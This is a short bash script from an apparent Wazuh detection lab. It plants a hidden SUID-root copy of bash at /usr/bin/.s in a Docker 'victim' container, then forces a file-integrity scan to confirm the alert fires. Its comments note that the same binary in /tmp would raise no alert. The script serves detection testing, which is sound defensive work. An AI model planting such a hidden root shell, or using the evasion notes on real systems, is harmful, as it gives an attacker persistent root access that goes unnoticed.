#!/usr/bin/env bash
# Plant a new SUID-root binary — classic post-exploitation persistence.
#
# It goes in /usr/bin, NOT /tmp. Wazuh's rootcheck does not look for SUID files at all
# (check_files/check_trojans/check_sys hunt rootkits, hidden pids and hidden ports), so a
# SUID binary in /tmp produces exactly zero alerts. What catches this is FIM, and FIM's
# default coverage is /etc, /usr/bin, /usr/sbin, /bin, /sbin, /boot. Hiding a suid bash
# among the system binaries is also the more realistic version of the trick.
set -euo pipefail
docker compose exec -T victim bash -lc "
cp /bin/bash /usr/bin/.s
chmod 4755 /usr/bin/.s
ls -l /usr/bin/.s
"
echo "==> SUID root binary planted at /usr/bin/.s"
echo "    /usr/bin is on FIM's scheduled scan, not realtime, so force a scan now"
echo "    (otherwise you wait for the next <frequency>, 300s in this lab)."
AGENT_ID=$("$(dirname "$0")"/victim-agent-id.sh)
docker compose exec -T wazuh.manager /var/ossec/bin/agent_control -r -u "$AGENT_ID"
echo
echo "    Scan + alert takes ~1-2 min under emulation. Then:"
echo "      docker compose exec -T wazuh.manager sh -c \\"
echo "        'grep \"usr/bin/\\\\.s\" /var/ossec/logs/alerts/alerts.json | tail -1' | jq ."
